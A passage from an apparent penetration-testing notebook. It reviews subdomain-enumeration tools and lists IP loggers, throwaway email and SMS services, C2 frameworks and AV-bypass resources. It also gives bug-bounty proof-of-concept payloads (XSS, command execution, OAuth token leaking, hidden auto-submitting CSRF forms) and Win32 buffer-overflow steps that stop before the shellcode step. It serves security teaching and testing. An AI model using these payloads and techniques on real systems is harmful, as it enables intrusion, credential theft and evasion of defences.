<li>Bruteforce: <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-20000.txt">danielmiessler/Discovery/DNS/subdomains-top1million-20000.txt</a></li>
<li>Alterations: <a href="https://github.com/infosec-au/altdns/blob/master/words.txt">altdns/words.txt</a></li>
</ul>
<p>This is not intended to be a serious investigation, a technical paper, or anything like that, just a series of tests that I have done for fun. The results shown are my opinion and if at any time you don't like them, or you don't agree, you can stop reading or explain to me how I could have done it better 😉</p>
<p>All the results of my runs and tests are posted <a href="https://docs.google.com/spreadsheets/d/1Fa_dv4jnMCDcpa_RQy12TpEZQNo1l8KsDFJscPjnePo/edit?usp=sharing">here</a>, it has four sheets (Summary, Small scope, Medium Scope and Large Scope).</p>
<p>https://docs.google.com/spreadsheets/d/1Fa_dv4jnMCDcpa_RQy12TpEZQNo1l8KsDFJscPjnePo/edit?usp=sharing</p>
<p>In addition, the results of all the scans that I have done have been uploaded to a folder that you can see <a href="https://drive.google.com/drive/folders/1urkJUrHHal3-UYB0R-3g8VWSBNGVP1d7?usp=sharing">here</a>.</p>
<h2 id="tools-39"><a class="header" href="#tools-39">Tools</a></h2>
<p>Small summary of each tool with the features and results that I got. This section not follows any special order.</p>
<h3 id="amass"><a class="header" href="#amass"><a href="https://github.com/OWASP/Amass">amass</a></a></h3>
<ul>
<li>Author: <a href="https://github.com/OWASP">OWASP</a> (mainly <a href="https://github.com/caffix">caffix</a>).</li>
<li>Language: Go.</li>
<li>Type: Passive, Active, Bruteforce, Alterations (only Active and Passive tested here).</li>
<li>Api Keys added: 16 (AlienVault, Binary Edge, Censys, Chaos, Cloudflare, Facebook, Github, NetworksDB, PassiveTotal, ReconDev, SecurityTrails, Shodan, SpySe, UrlScan, VirusTotal, WhoIsXML).</li>
</ul>
<p>Well known tool for the enumeration of subdomains. It's basically an all-in-one because it does everything, plus many other things apart from the subdomains. In the case of this tool, I have only analyzed the passive and active approaches because there is no way to do a unit analysis for brute force or alterations without consulting third-party services previously (or at least I have not known how to do it).</p>
<h4 id="pros-21"><a class="header" href="#pros-21">Pros</a></h4>
<ul>
<li>Lot of third-party integrations</li>
<li>Swiss army knife for subdomains enumeration, all the functionalities you can think of and more.</li>
<li>It added active subdomains that none of the other tools managed to add.</li>
</ul>
<h4 id="cons-21"><a class="header" href="#cons-21">Cons</a></h4>
<ul>
<li>Not fast at all.</li>
<li>Sometimes usability is confusing due to the large number of options</li>
</ul>
<h3 id="sublist3r"><a class="header" href="#sublist3r"><a href="https://github.com/aboul3la/Sublist3r">Sublist3r</a></a></h3>
<ul>
<li>Author: <a href="https://github.com/aboul3la">aboul3la</a></li>
<li>Language: Python</li>
<li>Type: Passive, Bruteforce (only Passive tested here).</li>
<li>Api Keys added: 0.</li>
</ul>
<p>Widely used on a lot of tools since it's been around since 2015, plus you don't need to add additional API keys. One problem that I found with this tool is that it does not allow resolving subdomains found passively, but it does incorporate subbrute for bruteforce, which it does DNS resolution, but on the contrary it does not allow to specify a different wordlist, for this reason don't test the bruteforce feature.</p>
<h4 id="pros-22"><a class="header" href="#pros-22">Pros</a></h4>
<ul>
<li>Really fast.</li>
<li>Include subbrute for bruteforcing.</li>
<li>Include port scan.</li>
</ul>
<h4 id="cons-22"><a class="header" href="#cons-22">Cons</a></h4>
<ul>
<li>Few results compared to others.</li>
<li>Limited features, such as bruteforce without the ability to specify a custom wordlist.</li>
</ul>
<h3 id="crobat"><a class="header" href="#crobat"><a href="https://github.com/Cgboal/SonarSearch">crobat</a></a></h3>
<ul>
<li>Author: <a href="https://github.com/Cgboal">Cgboal</a></li>
<li>Language: Go</li>
<li>Type: Passive</li>
<li>Api Keys added: 0.</li>
</ul>
<p>It is basically the easiest way to consult the Rapid7's Project Sonar Database. </p>
<h4 id="pros-23"><a class="header" href="#pros-23">Pros</a></h4>
<ul>
<li>Consults in one of the best data sources.</li>
<li>Ultra-fast.</li>
</ul>
<h4 id="cons-23"><a class="header" href="#cons-23">Cons</a></h4>
<ul>
<li>Nothing in particular, does a very specific thing and does it well.</li>
</ul>
<h3 id="chaos"><a class="header" href="#chaos"><a href="https://github.com/projectdiscovery/chaos-client">chaos</a></a></h3>
<ul>
<li>Author: <a href="https://github.com/projectdiscovery">projectdiscovery</a></li>
<li>Language: Go</li>
<li>Type: Passive</li>
<li>Api Keys added: 1 (Chaos).</li>
</ul>
<p>Official client to consult the Chaos database. It is mainly oriented for bug bounty, it contains the database of all the programs.</p>
<h4 id="pros-24"><a class="header" href="#pros-24">Pros</a></h4>
<ul>
<li>Ultra-fast.</li>
<li>Allow to update dataset with your own findings.</li>
<li>Multiple filters and outputs options.</li>
</ul>
<h4 id="cons-24"><a class="header" href="#cons-24">Cons</a></h4>
<ul>
<li>API Key limited to invitations.</li>
</ul>
<h3 id="subfinder"><a class="header" href="#subfinder"><a href="https://github.com/projectdiscovery/subfinder">subfinder</a></a></h3>
<ul>
<li>Author: <a href="https://github.com/projectdiscovery">projectdiscovery</a></li>
<li>Language: Go</li>
<li>Type: Passive and Active.</li>
<li>Api Keys added: 13 (BinaryEdge, Censys, Chaos, DnsDB, GitHub, PassiveTotal, ReconDev, Robtex, SecurityTrails, Shodan, SpySe, UrlScan, VirusTotal).</li>
</ul>
<p>The definitive subdomain tool from projectdiscovery is the one that gets the most results in passive and active mode. Simply the best.</p>
<h4 id="pros-25"><a class="header" href="#pros-25">Pros</a></h4>
<ul>
<li>Fast compared with others with similar number of integrations.</li>
<li>Use 35 third-party services in total.</li>
<li>Lot of options for search, filters and output.</li>
</ul>
<h4 id="cons-25"><a class="header" href="#cons-25">Cons</a></h4>
<ul>
<li>Amass got a few subdomains that subfinder missed only in the large scope.</li>
</ul>
<h3 id="altdns"><a class="header" href="#altdns"><a href="https://github.com/infosec-au/altdns">altdns</a></a></h3>
<ul>
<li>Author: <a href="https://github.com/infosec-au">infosec-au</a></li>
<li>Language: Python</li>
<li>Type: Alterations.</li>
</ul>
<p>The most popular tool for subdomain alteration and resolution. It currently has a <a href="https://github.com/infosec-au/altdns/issues/29#issuecomment-656686014">bug </a>that needs to be fixed to make the tool work.</p>
<h4 id="pros-26"><a class="header" href="#pros-26">Pros</a></h4>
<ul>
<li>Allows set custom resolver.</li>
<li>Output include CNAME.</li>
</ul>
<h4 id="cons-26"><a class="header" href="#cons-26">Cons</a></h4>
<ul>
<li>Really really slow.</li>
<li>Not the best alteration wordlist.</li>
</ul>
<h3 id="shuffledns"><a class="header" href="#shuffledns"><a href="https://github.com/projectdiscovery/shuffledns">shuffledns</a></a></h3>
<ul>
<li>Author: <a href="https://github.com/projectdiscovery">projectdiscovery</a></li>
<li>Language: Go</li>
<li>Type: Bruteforce.</li>
</ul>
<p>Fastest bruteforce and resolution subdomain tool by projectdisovery (yes, again). It's actually a massdns wrapper inside, but it makes it much easier to use with a simple syntax.</p>
<h4 id="pros-27"><a class="header" href="#pros-27">Pros</a></h4>
<ul>
<li>Fastest.</li>
<li>Allows directly massdns output.</li>
<li>Wildcard support.</li>
</ul>
<h4 id="cons-27"><a class="header" href="#cons-27">Cons</a></h4>
<ul>
<li>In some cases, it missed some subdomains that the rest did.</li>
</ul>
<h3 id="assetfinder"><a class="header" href="#assetfinder"><a href="https://github.com/tomnomnom/assetfinder">assetfinder</a></a></h3>
<ul>
<li>Author: <a href="https://github.com/tomnomnom">tomnomnom</a></li>
<li>Language: Go</li>
<li>Type: Passive.</li>
<li>Api Keys added: 3 (Facebook, VirusTotal, SpySe).</li>
</ul>
<p>This tool is aimed to find domains and subdomains related to a given domain. Related means, not just subdomains, but other which could be third-party urls for example.</p>
<h4 id="pros-28"><a class="header" href="#pros-28">Pros</a></h4>
<ul>
<li>Really fast for the amount of services integrated.</li>
<li>9 services included.</li>
<li>That "related" feature.</li>
</ul>
<h4 id="cons-28"><a class="header" href="#cons-28">Cons</a></h4>
<ul>
<li>No results not found by others.</li>
</ul>
<h3 id="waybackurls"><a class="header" href="#waybackurls"><a href="https://github.com/tomnomnom/waybackurls">waybackurls</a></a></h3>
<ul>
<li>Author: <a href="https://github.com/tomnomnom">tomnomnom</a></li>
<li>Language: Go</li>
<li>Type: Passive.</li>
<li>Api Keys added: 0.</li>
</ul>
<p>The main purpose of this tool is to fetch urls from WaybackMachine, but is widely used to retrieve subdomains too.</p>
<h4 id="pros-29"><a class="header" href="#pros-29">Pros</a></h4>
<ul>
<li>Fast.</li>
</ul>
<h4 id="cons-29"><a class="header" href="#cons-29">Cons</a></h4>
<ul>
<li>Not subdomains feature, you have to filter with some tool like <a href="https://github.com/tomnomnom/unfurl">unfurl</a> or grep.</li>
</ul>
<h3 id="github-subdomains"><a class="header" href="#github-subdomains"><a href="https://github.com/gwen001/github-subdomains">github-subdomains</a></a></h3>
<ul>
<li>Author: <a href="https://github.com/gwen001">gwen001</a></li>
<li>Language: Go</li>
<li>Type: Passive.</li>
<li>Api Keys added: 1 (GitHub).</li>
</ul>
<p>The main purpose of this tool is to fetch urls from WaybackMachine, but is widely used to retrieve subdomains too.</p>
<h4 id="pros-30"><a class="header" href="#pros-30">Pros</a></h4>
<ul>
<li>Fast.</li>
<li>GitHub is always a useful source.</li>
</ul>
<h4 id="cons-30"><a class="header" href="#cons-30">Cons</a></h4>
<ul>
<li>With some common names or companies could be very slow.</li>
</ul>
<h3 id="dnscan"><a class="header" href="#dnscan"><a href="https://github.com/rbsec/dnscan">dnscan</a></a></h3>
<ul>
<li>Author: <a href="https://github.com/rbsec">rbsec</a></li>
<li>Language: Python</li>
<li>Type: Bruteforce.</li>
</ul>
<p>Actively updated tool for bruteforce with some nice features like transfer zone checker and recursiveness.</p>
<h4 id="pros-31"><a class="header" href="#pros-31">Pros</a></h4>
<ul>
<li>Transfer zone feature.</li>
<li>Custom insertion points.</li>
<li>Provided with 7 wordlists.</li>
</ul>
<h4 id="cons-31"><a class="header" href="#cons-31">Cons</a></h4>
<ul>
<li>Python 2.</li>
</ul>
<h3 id="gobuster-1"><a class="header" href="#gobuster-1"><a href="https://github.com/OJ/gobuster">gobuster</a></a></h3>
<ul>
<li>Author: <a href="https://github.com/OJ">OJ</a></li>
<li>Language: Go</li>
<li>Type: Bruteforce.</li>
</ul>
<p>Mainly known for web fuzzing, it also has the option to scan for DNS. It's one of the must-have tools in the community.</p>
<h4 id="pros-32"><a class="header" href="#pros-32">Pros</a></h4>
<ul>
<li>Wildcard support.</li>
<li>Option to show CNAME or IP.</li>
</ul>
<h4 id="cons-32"><a class="header" href="#cons-32">Cons</a></h4>
<ul>
<li>None really.</li>
</ul>
<h3 id="knock"><a class="header" href="#knock"><a href="https://github.com/guelfoweb/knock">knock</a></a></h3>
<ul>
<li>Author: <a href="https://github.com/guelfoweb">guelfoweb</a></li>
<li>Language: Python</li>
<li>Type: Passive and Bruteforce.</li>
<li>Api Keys added: 1 (VirusTotal).</li>
</ul>
<p>It performs Passive scan and Bruteforce but not resolves what it found in passive. It does not stand out especially anywhere.</p>
<h4 id="pros-33"><a class="header" href="#pros-33">Pros</a></h4>
<ul>
<li>Transfer zone check.</li>
<li>CSV output customization.</li>
</ul>
<h4 id="cons-33"><a class="header" href="#cons-33">Cons</a></h4>
<ul>
<li>Python 2.</li>
<li>Output is messy.</li>
<li>Slow.</li>
</ul>
<h3 id="aiodnsbrute"><a class="header" href="#aiodnsbrute"><a href="https://github.com/blark/aiodnsbrute">aiodnsbrute</a></a></h3>
<ul>
<li>Author: <a href="https://github.com/blark">blark</a></li>
<li>Language: Python</li>
<li>Type: Bruteforce.</li>
</ul>
<p>According to its description is mainly focused in speed and also has with multiple output formats.</p>
<h4 id="pros-34"><a class="header" href="#pros-34">Pros</a></h4>
<ul>
<li>Multiple output formats.</li>
<li>Customizable DNS lookup query.</li>
<li>Fast.</li>
</ul>
<h4 id="cons-34"><a class="header" href="#cons-34">Cons</a></h4>
<ul>
<li>Feels outdated and abandoned.</li>
</ul>
<h3 id="dmut"><a class="header" href="#dmut"><a href="https://github.com/bp0lr/dmut">dmut</a></a></h3>
<ul>
<li>Author: <a href="https://github.com/bp0lr">bp0lr</a></li>
<li>Language: Go</li>
<li>Type: Alterations.</li>
</ul>
<p>Fast permutations tool with very good wordlist.</p>
<h4 id="pros-35"><a class="header" href="#pros-35">Pros</a></h4>
<ul>
<li>Fastest in its type.</li>
<li>Lot of DNS options to optimize.</li>
</ul>
<h4 id="cons-35"><a class="header" href="#cons-35">Cons</a></h4>
<ul>
<li>Output is a bit poor.</li>
</ul>
<h3 id="subdomain3"><a class="header" href="#subdomain3"><a href="https://github.com/yanxiu0614/subdomain3">subdomain3</a></a></h3>
<ul>
<li>Author: <a href="https://github.com/yanxiu0614">yanxiu0614</a></li>
<li>Language: Python</li>
<li>Type: Bruteforce.</li>
</ul>
<p>Bruteforce tools with some interesting additions like IP, CDN or CIDR support.</p>
<h4 id="pros-36"><a class="header" href="#pros-36">Pros</a></h4>
<ul>
<li>Fastest in its type.</li>
<li>The IP, CDN and CIDR support</li>
<li>Multi-level subdomains option.</li>
</ul>
<h4 id="cons-36"><a class="header" href="#cons-36">Cons</a></h4>
<ul>
<li>Python 2.</li>
<li>Feels outdated and abandoned.</li>
<li>In some cases, it missed some subdomains that the rest did.</li>
</ul>
<h3 id="sudomy-1"><a class="header" href="#sudomy-1"><a href="https://github.com/Screetsec/Sudomy">Sudomy</a></a></h3>
<ul>
<li>Author: <a href="https://github.com/Screetsec">Screetsec</a></li>
<li>Language: Python</li>
<li>Type: Passive, Active and Bruteforce (Bruteforce with Gobuster, so not tested).</li>
<li>Api Keys added: 9 (Shodan, Censys, VirusTotal, BinaryEdge, SecurityTrails, DnsDB, PassiveTotal, SpySe and Facebook).</li>
</ul>
<p>Much more than a subdomain tool, it's a recon suite, but the subdomain search process is not delegated to third parties, so it gets on this list.</p>
<h4 id="pros-37"><a class="header" href="#pros-37">Pros</a></h4>
<ul>
<li>Multiple options apart the subdomain search.</li>
<li>Active scan really fast.</li>
</ul>
<h4 id="cons-37"><a class="header" href="#cons-37">Cons</a></h4>
<ul>
<li>No results not found by others.</li>
<li>Active scans output could be better.</li>
</ul>
<h3 id="findomain"><a class="header" href="#findomain"><a href="https://github.com/Findomain/Findomain">Findomain</a></a></h3>
<ul>
<li>Author: <a href="https://github.com/Edu4rdSHL">Edu4rdSHL</a></li>
<li>Language: Rust</li>
<li>Type: Passive, Active and bruteforce.</li>
<li>Api Keys added: 4 (Facebook , Spyse, VirusTotal and SecurityTrails).</li>
</ul>
<p>Findomain is one of the standard subdomain finder tools in the industry, it has a limited free version and a paid full-featured version.</p>
<h4 id="pros-38"><a class="header" href="#pros-38">Pros</a></h4>
<ul>
<li>Really fast.</li>
<li>Free version is still completely useful.</li>
</ul>
<h4 id="cons-38"><a class="header" href="#cons-38">Cons</a></h4>
<ul>
<li>Paid version has all the features.</li>
<li>No customizable output file in free version.</li>
</ul>
<h2 id="results-2"><a class="header" href="#results-2">Results</a></h2>
<h3 id="passive"><a class="header" href="#passive">Passive</a></h3>
<p>With amass and subfinder this part is more than completed, but there are other tools that, depending on the objective, may provide valuable information.</p>
<ol>
<li>subfinder</li>
<li>amass</li>
<li>Findomain</li>
<li>Sudomy</li>
<li>sublist3r</li>
</ol>
<h3 id="active"><a class="header" href="#active">Active</a></h3>
<p>In this field subfinder is the best, I find it to get results incredibly fast.</p>
<ol>
<li>Findomain</li>
<li>subfinder</li>
<li>Sudomy</li>
<li>Amass</li>
</ol>
<h3 id="bruteforce"><a class="header" href="#bruteforce">Bruteforce</a></h3>
<p>Again projectdiscovery does a great job with shuffledns and is far from the rest of the tools in speed and options.</p>
<ol>
<li>shuffledns</li>
<li>Findomain</li>
<li>dnscan</li>
<li>gobuster</li>
<li>aiodnsbrute</li>
</ol>
<h3 id="alterations"><a class="header" href="#alterations">Alterations</a></h3>
<p>I don't find alterations and permutations with resolution useful, but in case you like it, dmut should be your option by far.</p>
<ol>
<li>dmut</li>
<li>altdns</li>
</ol>
<h2 id="final-thoughts-2"><a class="header" href="#final-thoughts-2">Final thoughts</a></h2>
<p>When I started the review, I believed that amass would be the winner in most cases, but it seems that I have found new tools with which to improve the workflow, just as it happened with gobuster in the bruteforce section. In the permutations/alterations part I don't see the utility, they don't solve anything quickly and I think it is much more useful to use tools like <a href="https://github.com/ProjectAnte/dnsgen">dnsgen</a> to generate a good wordlist of alterations and then run it with shuffledns, or any of the bruteforce tool to resolve them.</p>
<p>Finally, thanks to all the tools developers who facilitate our work and implement the recon methodology better and better.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="random"><a class="header" href="#random">Random</a></h1>
<h2 id="aliases"><a class="header" href="#aliases">Aliases</a></h2>
<pre><code># Aliases
alias cat="bat --style=grid"
alias dockly='docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock lirantal/dockly'
alias sniper='docker run -it xerosecurity/sn1per /bin/bash'
alias myip='ip -br -c a &amp;&amp; echo &amp;&amp; curl ifconfig.me'
alias lsla='colorls -lA --sd --gs --group-directories-first'
alias gitleaks='docker run --rm --name=gitleaks zricethezav/gitleaks -v --pretty -r 
alias grp='git reset --hard origin/master &amp;&amp; git pull'
alias ccat='pygmentize -O style=monokai -f console256 -g'
alias testssl='~/Escritorio/tools/testssl.sh/testssl.sh'
alias nano='micro'
alias scoutsuite='cd /home/user/tools/ScoutSuite &amp;&amp; docker run --rm -t \
-v ~/.aws:/root/.aws:ro \
-v "$(pwd)/results:/opt/scoutsuite-report" \
scoutsuite:latest \
aws'
alias services_running='systemctl list-units --type=service --state=running'
alias pwndb='sudo python3 ~/PATH/pwndb/pwndb.py --target'
alias s3scanner='sudo python3 ~/PATH/S3Scanner/s3scanner.py'
alias flumberbuckets='sudo python3 ~/PATH/flumberboozle/flumberbuckets/flumberbuckets.py -p'
function wordlists() { find ~/tools/payloads/ -type f -name "*$1*" }
# https://github.com/foospidy/payloads
</code></pre>
<h2 id="temporary-emails"><a class="header" href="#temporary-emails">Temporary emails</a></h2>
<pre><code># https://github.com/s0md3v/ote
ote init myusername

https://www.guerrillamail.com/en/
https://10minutemail.com
https://www.trash-mail.com/inbox/
https://www.mailinator.com
http://www.yopmail.com/en
https://generator.email
https://en.getairmail.com
http://www.throwawaymail.com/en
https://maildrop.cc
https://owlymail.com/en
https://www.moakt.com
https://tempail.com
http://www.yopmail.com
https://temp-mail.org/en
https://www.mohmal.com
http://od.obagg.com 
http://onedrive.readmail.net
http://xkx.me 
https://t.odmail.cn
https://www.emailondeck.com
https://anonbox.net
https://M.kuku.lu
https://www.temp-mails.com/
http://deadfake.com/
https://www.sharklasers.com/
https://mytemp.email/
http://www.mintemail.com/
http://www.eyepaste.com/
mailsucker.net
https://www.emailondeck.com/
https://getnada.com/
http://www.fakeinbox.com/
https://temp-mail.org/
https://www.tempmailaddress.com/
https://tempail.com/
https://tempm.com/
https://mailsac.com/
https://smailpro.com/
</code></pre>
<h2 id="temporary-sms-reception"><a class="header" href="#temporary-sms-reception">Temporary SMS reception</a></h2>
<pre><code>Online SMS: https://sms-online.co/
Text anywhere: http://www.textanywhere.net/
Proovl: https://www.proovl.com/numbers
Receive free SMS.NET: http://receivefreesms.net/
5SIM: https://5sim.net/
Receive SMS Online.IN: http://receivesmsonline.in/
Receive SMS online.EU: http://receivesmsonline.eu/
Groovl: https://www.groovl.com/
1S2U: https://1s2u.com/
Receive SMS online.ME: http://receivesmsonline.me/
Receive SMS: http://sms-receive.net/
Receive SMS Online.NET: https://www.receivesmsonline.net/
Receive free SMS: http://receivefreesms.com/
SMS Get: http://smsget.net/
Receive SMS online: https://receive-sms-online.com/
Receive an SMS: https://receive-a-sms.com/
Pinger: https://www.pinger.com/
7 SIM.NET: http://7sim.net/
Send SMS now: http://www.sendsmsnow.com/
Temporary emails: https://www.temp-mails.com/
Vritty: https://virtty.com/
Free SMS code: https://freesmscode.com/
HS3X: http://hs3x.com/
Get a free SMS number: https://getfreesmsnumber.com/
See SMS: https://www.smsver.com/
SMS.SELLAITE: http://sms.sellaite.com/
Trash Mobile https://es.mytrashmobile.com/numeros
</code></pre>
<h2 id="free-sms-send"><a class="header" href="#free-sms-send">Free SMS send</a></h2>
<pre><code>https://freebulksmsonline.com/
https://www.afreesms.com/
https://smsend.ru/
https://txtemnow.com/
http://www.sendanonymoussms.com/
http://www.textem.net/
http://www.txtdrop.com/
</code></pre>
<h2 id="ip-loggers-services"><a class="header" href="#ip-loggers-services">Ip loggers services</a></h2>
<pre><code>ezstat.ru 
iplogger.org
2no.co
iplogger.com
iplogger.ru
yip.su
iplogger.co
iplogger.info
ipgrabber.ru
ipgraber.ru
iplis.ru
02ip.ru
</code></pre>
<h2 id="tunneling-services"><a class="header" href="#tunneling-services">Tunneling services</a></h2>
<pre><code>https://localxpose.io/
https://serveo.net/
https://ngrok.com/
https://localtunnel.me/
https://openport.io/
https://pagekite.net/
</code></pre>
<h2 id="default-credentials-lists"><a class="header" href="#default-credentials-lists">Default credentials lists</a></h2>
<pre><code>https://cirt.net/passwords
https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
https://github.com/LandGrey/pydictor
https://github.com/Mebus/cupp
https://github.com/sc0tfree/mentalist
https://github.com/ihebski/DefaultCreds-cheat-sheet

# Check this tool
https://github.com/noraj/pass-station/
</code></pre>
<h2 id="c2"><a class="header" href="#c2">C2</a></h2>
<pre><code># Empire
# https://github.com/BC-SECURITY/Empire

# PoshC2
# https://github.com/nettitude/PoshC2

# Byob
# https://github.com/malwaredllc/byob
</code></pre>
<h2 id="others-1"><a class="header" href="#others-1">Others</a></h2>
<pre><code># Dedupe wordlists
# https://github.com/nil0x42/duplicut
./duplicut wordlist.txt -o clean-wordlist.txt

# Printer attacks
https://github.com/RUB-NDS/PRET

# Malware online analysis
https://app.any.run/
https://www.virustotal.com/gui/
https://tria.ge/
https://antiscan.me/
https://www.hybrid-analysis.com/
https://www.joesandbox.com/

# Chrome extension analyzer
https://thehackerblog.com/tarnish/#

# Github update fork from original
git remote add upstream https://github.com/[Original Owner Username]/[Original Repository].git
git fetch upstream
git checkout master
git merge upstream/master
git push

# VPN attack framework
https://github.com/klezVirus/vortex

# Ip rotation
https://gist.github.com/carlware/f02e14232177c18f33b5743bde916d8a

# Redirect your browser traffic through VPS
ssh -CqN -D 1337 root@YUOR.DEST.NEW.IP
# Now configure your browser proxy to 1337
</code></pre>
<h3 id="av-bypasses-techniques"><a class="header" href="#av-bypasses-techniques">AV Bypasses techniques</a></h3>
<p>https://cmepw.github.io/BypassAV/</p>
<p><img src="others/../.gitbook/assets/Bypass-AV.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="master-assessment-mindmaps"><a class="header" href="#master-assessment-mindmaps">Master assessment mindmaps</a></h1>
<p><img src="others/../.gitbook/assets/image%20(24).png" alt="" /></p>
<p><img src="https://blog.it-securityguard.com/pbbt.png" alt="" /></p>
<p><img src="others/../.gitbook/assets/Methodology%5B1%5D.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="bugbounty"><a class="header" href="#bugbounty">BugBounty</a></h1>
<h2 id="httpsgithubcombugcrowdtemplates"><a class="header" href="#httpsgithubcombugcrowdtemplates"><a href="https://github.com/bugcrowd/templates">https://github.com/bugcrowd/templates</a></a></h2>
<h2 id="good-poc"><a class="header" href="#good-poc">Good PoC</a></h2>
<div class="table-wrapper"><table><thead><tr><th>Issue type</th><th>PoC</th></tr></thead><tbody>
<tr><td>Cross-site scripting</td><td><code>alert(document.domain)</code> or <code>setInterval`alert\x28document.domain\x29`</code> if you have to use backticks. <a href="https://medium.com/@know.0nix/jumping-to-the-hell-with-10-attempts-to-bypass-devils-waf-4275bfe679dd">[1]</a> Using <code>document.domain</code> instead of <code>alert(1)</code> can help avoid reporting XSS bugs in sandbox domains.</td></tr>
<tr><td>Command execution</td><td><p>Depends of program rules:</p><ul><li>Read (Linux-based): <code>cat /proc/1/maps</code></li><li>Write (Linux-based): <code>touch /root/your_username</code></li><li>Execute (Linux-based): <code>id</code></li></ul></td></tr>
<tr><td>Code execution</td><td><p>This involves the manipulation of a web app such that server-side code (e.g. PHP) is executed.</p><ul><li>PHP: <code>&lt;?php echo 7*7; ?&gt;</code></li></ul></td></tr>
<tr><td>SQL injection</td><td><p>Zero impact</p><ul><li>MySQL and MSSQL: <code>SELECT @@version</code></li><li>Oracle: <code>SELECT version FROM v$instance;</code></li><li>Postgres SQL: <code>SELECT version()</code></li></ul></td></tr>
<tr><td>Unvalidated redirect</td><td><ul><li>Set the redirect endpoint to a known safe domain (e.g. <code>google.com</code>), or if looking to demonstrate potential impact, to your own website with an example login screen resembling the target's.</li><li>If the target uses OAuth, you can try to leak the OAuth token to your server to maximise impact. </li></ul></td></tr>
<tr><td>Information exposure</td><td>Investigate only with the IDs of your own test accounts — do not leverage the issue against other users' data — and describe your full reproduction process in the report.</td></tr>
<tr><td>Cross-site request forgery</td><td>When designing a real-world example, either hide the form (<code>style="display:none;"</code>) and make it submit automatically, or design it so that it resembles a component from the target's page.</td></tr>
<tr><td>Server-side request forgery</td><td><p>The impact of a SSRF bug will vary — a non-exhaustive list of proof of concepts includes:</p><ul><li>reading local files</li><li>obtaining cloud instance metadata</li><li>making requests to internal services (e.g. Redis)</li><li>accessing firewalled databases</li></ul></td></tr>
<tr><td>Local file read</td><td>Make sure to only retrieve a harmless file. Check the program security policy as a specific file may be designated for testing.</td></tr>
<tr><td>XML external entity processing</td><td>Output random harmless data.</td></tr>
<tr><td>Sub-domain takeover</td><td>Claim the sub-domain discreetly and serve a harmless file on a hidden page. Do not serve content on the index page.</td></tr>
</tbody></table>
</div>
<h2 id="good-report"><a class="header" href="#good-report">Good Report</a></h2>
<pre><code># Writeups
# https://github.com/devanshbatham/Awesome-Bugbounty-Writeups
</code></pre>
<pre><code># Bug bounty Report

# Summary
...

# Vulnerability details
...

# Impact
...

# Proof of concept
...

# Browsers verified in
...

# Mitigation
...
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="exploiting"><a class="header" href="#exploiting">Exploiting</a></h1>
<h4 id="basics-2"><a class="header" href="#basics-2">Basics</a></h4>
<pre><code class="language-text">**Tools** 
https://github.com/apogiatzis/gdb-peda-pwndbg-gef
* gdb-peda
* gdb-gef
* pwndbg
* radare2
* ropper
* pwntools

# Web compiler
https://www.godbolt.org/
</code></pre>
<pre><code class="language-text"># Check protections:
checksec binary
rabin2 -I ret2win32

# Functions
rabin2 -i 

# Strings
rabin2 -z ret2win32
</code></pre>
<h4 id="bof-basic-win32"><a class="header" href="#bof-basic-win32">BOF Basic Win32</a></h4>
<pre><code class="language-text">1. Send "A"*1024
2. Replace "A" with /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l LENGTH
3. When crash "!mona findmsp" (E10.11.1.111 offset) or ""/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q TEXT" or "!mona pattern_offset eip"
4. Confirm the location with "B" and "C"
5. Check for badchars instead CCCC (ESP):
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30" "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50" "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60" "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70" "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80" "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90" "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0" "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0" "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0" "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
with script _badchars.py and 
"!mona compare -a esp -f C:\Users\IEUser\Desktop\badchar_test.bin"
    5.1 AWESOME WAY TO CHECK BADCHARS (https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/):
        a. !mona config -set workingfolder c:\logs\%p
        b. !mona bytearray -b "\x00\x0d"
        c. Copy from c:\logs\%p\bytearray.txt to python exploit and run again
        d. !mona compare -f C:\logs\%p\bytearray.bin -a 02F238D0 (ESP address)
        e. In " data", before unicode chars it shows badchars.
 6. Find JMP ESP with "!mona modules" or "!mona jmp -r esp" or "!mona jmp -r esp -cpb '\x00\x0a\x0d'" find one with security modules "FALSE"

    6.1 Then, "!mona find -s "\xff\xe4" -m PROGRAM/DLL-FALSE"
    6.2 Remember put the JMP ESP location in reverse order due to endianness: 5F4A358F will be \x8f\x35\x4a\x5f


7. Generate shellcode and place it:
